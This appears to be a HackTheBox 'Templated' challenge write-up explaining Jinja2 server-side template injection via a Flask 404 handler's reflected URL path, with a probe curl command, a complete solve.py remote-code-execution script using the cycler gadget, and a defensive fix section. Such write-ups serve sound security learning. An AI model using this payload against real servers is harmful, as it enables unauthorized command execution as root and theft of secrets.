---
title: "Templated"
date: 2027-01-25 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssti, jinja2, flask, rce, werkzeug]
description: "An Easy Web challenge that is a textbook Jinja2 Server-Side Template Injection — except the injection point is the URL path itself, reflected by Flask's 404 handler through render_template_string. The only twist is that Werkzeug rejects an encoded slash in the path, so the command-execution payload has to stay slash-free."
---

## Overview

`Templated` is an Easy HackTheBox **Web** challenge. The app is a near-empty Flask
site whose only content is a banner — *"Site still under construction / Proudly powered
by Flask/Jinja2"* — served by `Werkzeug/1.0.1 Python/3.9.0`. That banner is the whole
hint: the 404 handler reflects the requested URL **path** straight into a Jinja2 template,
giving [server-side template injection](https://cwe.mitre.org/data/definitions/1336.html)
and, through it, remote code execution as `root`.

## The technique

Flask's "page not found" response is built by string-formatting the requested path into
a template that is then rendered with `render_template_string`, roughly:

```python
@app.errorhandler(404)
def page_not_found(e):
    return render_template_string(
        "The page '%s' could not be found" % request.path), 404
```

Because the user-controlled path goes *into the template source* (not passed as a bound
context variable), any `{{ ... }}` in the URL is evaluated server-side. No form, no
parameter — the path is the injection point.

The one gotcha: the payload lives in the URL path, and **Werkzeug 1.0.1 returns its own
default 404 (never reaching the app) the moment the path contains `%2F`**. So a `/`
anywhere in the shell command silently kills the exploit. Two response tells distinguish
the cases — the *app's* custom page (`The page '...' could not be found`) means the app
was reached, while Werkzeug's plain `<title>404 Not Found</title>` means the encoded
slash was rejected.

## Solution

Confirm SSTI with a math probe in the path (`{{7*7}}`, URL-encoded):

```bash
curl -s "http://<host>:<port>/%7B%7B7*7%7D%7D"
# -> The page '<str>49</str>' could not be found
```

`49` (not the literal `{{7*7}}`) confirms the path is rendered. Escalate to RCE with the
`cycler` gadget, which reaches `os` with no `self`/`config` reference. Keep the command
slash-free — the app's working directory is `/` and `flag.txt` lives right there, so
`cat flag.txt` needs no slash:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, urllib.request, urllib.parse, re, html
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}/"

def rce(cmd):
    payload = "{{ cycler.__init__.__globals__.os.popen('" + cmd + "').read() }}"
    url = base + urllib.parse.quote(payload, safe='')   # safe='' => encode '/'
    body = urllib.request.urlopen(url, timeout=15).read().decode('utf-8', 'replace')
    m = re.search(r"<str>(.*?)</str>", body, re.S)
    return html.unescape(m.group(1)).strip() if m else body

assert "49" in rce("echo $((7*7))"), "SSTI not confirmed"
print(rce("cat flag.txt"))
```

```bash
python3 solve.py <host> <port>
# -> HTB{...}
```

The same `rce()` helper runs `id` (`uid=0(root)`), `ls -la`, or `env` for enumeration —
the rendering process runs as root.

## Why it worked

User input was placed into the **template source string** instead of being passed as a
rendering **context value**. Jinja2 compiles and executes whatever it is handed, and
Python's introspection (`__init__.__globals__`) lets a template expression escape to the
`os` module and run arbitrary commands.

## Fix / defense

- Never build a template by concatenating or `%`-formatting untrusted input. Pass it as a
  context variable: `render_template_string("The page '{{ p }}' ...", p=request.path)`,
  where `p` is auto-escaped and never evaluated.
- Prefer static templates with `{{ variable }}` placeholders over `render_template_string`
  on dynamic strings.
- If dynamic rendering is unavoidable, use a hardened `jinja2.sandbox.SandboxedEnvironment`
  — though the real fix is to not template user input at all.
- Run the app under a low-privilege account, never `root`, so any RCE is contained.
